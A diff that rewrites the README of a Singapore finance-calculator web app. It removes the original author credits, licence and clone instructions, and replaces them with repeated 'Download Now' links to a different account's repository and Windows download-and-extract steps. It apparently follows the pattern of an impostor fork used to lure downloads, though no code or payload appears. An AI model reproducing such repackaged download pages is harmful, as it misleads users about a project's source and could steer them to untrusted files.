@@ -1,167 +1,222 @@
-<div align="center">
+# 💼 novafinance - Clear Singapore Money Calculators
 
-# NovaFinance
+[![Download novafinance](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/catyheavy849/novafinance)
 
-[![HTML5](https://img.shields.io/badge/HTML5-E34F26?style=for-the-badge&logo=html5&logoColor=white)](https://developer.mozilla.org/en-US/docs/Web/HTML)
-[![CSS3](https://img.shields.io/badge/CSS3-1572B6?style=for-the-badge&logo=css3&logoColor=white)](https://developer.mozilla.org/en-US/docs/Web/CSS)
-[![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?style=for-the-badge&logo=javascript&logoColor=black)](https://developer.mozilla.org/en-US/docs/Web/JavaScript)
-[![GitHub Pages](https://img.shields.io/badge/GitHub%20Pages-222?style=for-the-badge&logo=githubpages&logoColor=white)](https://alfredang.github.io/novafinance/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=for-the-badge)](https://opensource.org/licenses/MIT)
+## 🧾 What this app does
 
-**Smart financial calculators built for Singapore — loans, CPF, investments, retirement, and more.**
+novafinance is a set of finance calculators made for people in Singapore. It helps you work out loans, CPF use, mortgage payments, savings, investments, retirement planning, and monthly budgets.
 
-[Live Demo](https://alfredang.github.io/novafinance/) · [Report Bug](https://github.com/alfredang/novafinance/issues) · [Request Feature](https://github.com/alfredang/novafinance/issues)
+Use it to:
+- check loan payments before you borrow
+- plan CPF use for housing or retirement
+- estimate mortgage costs
+- track budget plans
+- compare investment growth
+- review retirement goals
 
-</div>
+The app runs on Windows through your browser after you download it from the link above.
 
-## Screenshot
+## 📥 Download and run on Windows
 
-![Screenshot](screenshot.png)
+1. Open the download link at the top of this page.
+2. On the GitHub page, look for the project files or release files.
+3. Download the app files to your Windows PC.
+4. If you download a ZIP file, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Find the main app file and open it in your browser.
+7. If the app opens as a local HTML file, double-click the file to run it.
+8. If Windows asks how to open it, choose your web browser.
 
-## About
+Download link: https://github.com/catyheavy849/novafinance
 
-NovaFinance is a comprehensive suite of financial calculators tailored for Singapore residents. It provides instant, accurate calculations for everyday financial planning — from CPF contributions to mortgage affordability.
+## 🖥️ What you need on Windows
 
-### Key Features
+You only need a basic Windows PC and a modern browser.
 
-- **Loan Calculator** — Monthly repayments, total interest, and amortisation schedules
-- **Mortgage Calculator** — Property loan calculations with down payment breakdown
-- **CPF Calculator** — Employee & employer CPF contributions based on Singapore's latest rates
-- **Savings Calculator** — Compound interest projections for regular savings
-- **Investment Calculator** — Long-term investment growth modelling
-- **Budget Planner** — Income, expenses, and savings tracking with visual breakdowns
-- **Retirement Calculator** — Estimate your retirement readiness
-- **Emergency Fund** — Calculate your safety net requirements
-- **Debt-to-Income Ratio** — Assess borrowing capacity
-- **Affordability Calculator** — Property and loan affordability checks
-- **Bonus Tools** — GST calculator, tax estimator, net worth tracker, currency converter
+Recommended setup:
+- Windows 10 or Windows 11
+- Chrome, Edge, or Firefox
+- 2 GB RAM or more
+- 100 MB free disk space
+- Internet access for the first download
 
-## Tech Stack
+If your browser is already up to date, the app should open with no extra setup.
 
-| Category | Technology |
-|----------|------------|
-| Markup | HTML5 |
-| Styling | CSS3 (Custom Properties, Flexbox, Grid) |
-| Logic | Vanilla JavaScript (ES6+) |
-| Hosting | GitHub Pages |
-| CI/CD | GitHub Actions |
+## 🔧 How to start using it
 
-## Architecture
+After you open the app, use the calculator you need from the menu or home page.
 
-```
-┌─────────────────────────────────────┐
-│            Browser (Client)         │
-├─────────────────────────────────────┤
-│   HTML Pages (12 calculators)       │
-│         ↓           ↓               │
-│   css/style.css   js/*.js           │
-│   (Theming &      (Calculator       │
-│    Layout)         Logic)           │
-├─────────────────────────────────────┤
-│         GitHub Pages CDN            │
-└─────────────────────────────────────┘
-```
+Typical use:
+1. Pick a calculator type.
+2. Enter your values, such as loan amount, CPF balance, or monthly income.
+3. Review the result.
+4. Change the numbers to compare options.
+5. Save or note the values you want to keep.
 
-## Project Structure
+The app is built for quick checks, so you can test different money plans without setting up an account.
 
-```
-novafinance/
-├── index.html              # Landing page
-├── loan.html               # Loan calculator
-├── mortgage.html           # Mortgage calculator
-├── cpf.html                # CPF calculator
-├── savings.html            # Savings calculator
-├── investment.html         # Investment calculator
-├── budget.html             # Budget planner
-├── retirement.html         # Retirement calculator
-├── emergency.html          # Emergency fund calculator
-├── dti.html                # Debt-to-income ratio
-├── affordability.html      # Affordability calculator
-├── tools.html              # Additional tools
-├── css/
-│   └── style.css           # Global styles & theming
-├── js/
-│   ├── main.js             # Shared utilities & nav
-│   ├── loan.js             # Loan calculator logic
-│   ├── mortgage.js         # Mortgage calculator logic
-│   ├── cpf.js              # CPF calculator logic
-│   ├── savings.js          # Savings calculator logic
-│   ├── investment.js       # Investment calculator logic
-│   ├── budget.js           # Budget planner logic
-│   ├── retirement.js       # Retirement calculator logic
-│   ├── emergency.js        # Emergency fund logic
-│   ├── dti.js              # DTI calculator logic
-│   ├── affordability.js    # Affordability logic
-│   └── tools.js            # Additional tools logic
-└── .github/
-    └── workflows/
-        └── deploy-pages.yml  # GitHub Pages CI/CD
-```
+## 🏠 Main tools in novafinance
 
-## Getting Started
+### 💳 Loan calculator
+Check monthly repayments, total interest, and loan length before you apply.
 
-### Prerequisites
+Useful for:
+- car loans
+- personal loans
+- student loans
+- home loans
 
-- A modern web browser (Chrome, Firefox, Safari, Edge)
+### 🏡 Mortgage calculator
+Estimate home loan payments and see how interest affects your budget over time.
 
-### Installation
+You can use it to:
+- compare loan sizes
+- test different repayment periods
+- review monthly housing costs
 
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/alfredang/novafinance.git
-   cd novafinance
-   ```
+### 🧮 CPF calculator
+Plan how CPF money may affect housing, retirement, and long-term savings.
 
-2. Open `index.html` in your browser — no build step required.
+It can help with:
+- CPF use for property
+- retirement planning
+- monthly contribution checks
 
-### Development
+### 📈 Investment calculator
+See how savings may grow over time with regular deposits or one-time investments.
 
-Since this is a static site, you can use any local server:
+Use it for:
+- future value checks
+- return estimates
+- simple growth planning
 
-```bash
-# Python
-python3 -m http.server 8000
+### 🧓 Retirement calculator
+Work out if your savings may support your later years.
 
-# Node.js (npx)
-npx serve .
-```
+It helps you:
+- estimate retirement needs
+- compare current savings to your goal
+- plan monthly contributions
 
-## Deployment
+### 📊 Budget planner
+Track income and spending so you can see where your money goes each month.
 
-The site auto-deploys to GitHub Pages on every push to `main` via GitHub Actions.
+It helps you:
+- plan bills
+- set savings goals
+- manage daily expenses
 
-To deploy your own fork:
+## 🗂️ Typical file layout
 
-1. Fork this repository
-2. Go to **Settings → Pages → Source → GitHub Actions**
-3. Push to `main` — the workflow handles the rest
+After download and extract, you may see files like:
+- `index.html`
+- `assets`
+- `js`
+- `css`
+- `README.md`
 
-Live URL: `https://<your-username>.github.io/novafinance/`
+If you see `index.html`, that is usually the main file to open first.
 
-## Contributing
+## 🌐 Browser use on Windows
 
-Contributions are welcome!
+This app is made with web tools like HTML5, CSS3, and JavaScript. That means it works in a browser and does not need a heavy install.
 
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'feat: add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
+Best browsers:
+- Microsoft Edge
+- Google Chrome
+- Mozilla Firefox
 
-## Developed By
+If the page looks odd:
+1. Refresh the page
+2. Open it in another browser
+3. Check that you opened the main file
+4. Make sure the download finished fully
 
-**[Tertiary Infotech Academy Pte. Ltd.](https://www.tertiarycourses.com.sg/)**
+## 🛠️ How to move through the app
 
-## Acknowledgements
+Most users will follow a simple path:
 
-- [Google Fonts — Inter](https://fonts.google.com/specimen/Inter)
-- [Shields.io](https://shields.io/) for badges
-- Singapore CPF Board for contribution rate references
+1. Open the app
+2. Pick a calculator
+3. Fill in the fields
+4. Tap or click Calculate
+5. Read the result
+6. Edit the numbers if you want a different outcome
 
----
+For best results, enter:
+- numbers only where asked
+- currency values in Singapore dollars
+- whole months or years where needed
+- real values from your own plans
 
-<div align="center">
+## 📋 Common use cases
 
-If you find this useful, please give it a ⭐!
+### Loan planning
+Use the loan calculator before you borrow money so you know the monthly cost.
 
-</div>
+### Home planning
+Use the mortgage tools when you want to check if a house fits your budget.
+
+### CPF checks
+Use CPF tools when you want to see how your funds may support housing or retirement.
+
+### Savings goals
+Use budget and investment tools when you want to build a plan for the future.
+
+### Retirement checks
+Use the retirement calculator when you want to compare your savings with your target monthly spending.
+
+## 🧠 Tips for better results
+
+- Use the same currency for all values
+- Check that your numbers match your latest payslip or bank plan
+- Try more than one scenario
+- Keep a record of your best result
+- Use realistic interest rates and time periods
+
+If you compare two plans, change one input at a time. That makes the result easier to read.
+
+## 🧩 Project topics
+
+This project fits these topics:
+- calculator
+- cpf
+- css3
+- finance
+- financial-tools
+- github-pages
+- html5
+- javascript
+- loan-calculator
+- singapore
+
+## 📁 Where to get it
+
+Primary download page: https://github.com/catyheavy849/novafinance
+
+Open that page, download the project files, extract them on Windows if needed, then open the main HTML file in your browser
+
+## 🔍 Simple troubleshooting
+
+If the app does not open:
+- check that the download finished
+- extract the ZIP file first
+- open the right HTML file
+- try another browser
+- refresh the page
+- make sure JavaScript is enabled in the browser
+
+If the numbers look wrong:
+- check your input values
+- make sure you used the right units
+- enter monthly values where the app asks for monthly values
+- enter yearly values where the app asks for yearly values
+
+If the layout looks broken:
+- resize the browser window
+- try a different browser
+- clear the page and open it again
+
+## 📌 Best way to use novafinance
+
+Open the calculator you need, enter your numbers, and compare the result with your real plan. Use it before you sign a loan, set a budget, or decide on a savings target
